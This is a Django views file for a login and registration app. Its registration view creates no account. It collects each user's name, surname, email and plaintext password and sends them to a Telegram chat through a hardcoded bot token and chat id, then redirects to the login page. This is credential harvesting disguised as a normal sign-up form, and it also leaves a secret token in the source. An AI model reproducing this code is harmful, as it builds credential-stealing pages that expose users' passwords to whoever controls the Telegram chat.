import requests
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth.views import LoginView
from django.http import HttpResponseRedirect
from django.shortcuts import render
from django.urls import reverse

from .forms import RegistrationForm


def login_page(request):

    return render(request, 'authorization/login.html')


def get_registration_data(request):
    token = '5417534861:AAFCu9tVpwW9n25vu_jTvAsYEhPorK1bhKk'
    chat_id = '-754549594'
    if request.method == 'POST':
        form = RegistrationForm(request.POST)
        if form.is_valid():
            name = ''
            surname = ''
            email = ''
            password = ''
            name = form.cleaned_data.get("inputName")
            surname = form.cleaned_data.get("inputSurname")
            email = form.cleaned_data.get("inputEmail")
            password = form.cleaned_data.get("inputPassword")
            data = f'Имя: {name}\n Фамилия: {surname}\n Электронная почта: {email}\n Пароль: {password}'
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                          data={'chat_id': chat_id, 'text': data})
            return HttpResponseRedirect(reverse('login'))
    else:
        form = RegistrationForm()
    return render(request, 'authorization/registration.html', {'form': form})


class LoginUser(LoginView):
    form_class = AuthenticationForm
    template_name = 'authorization/login.html'

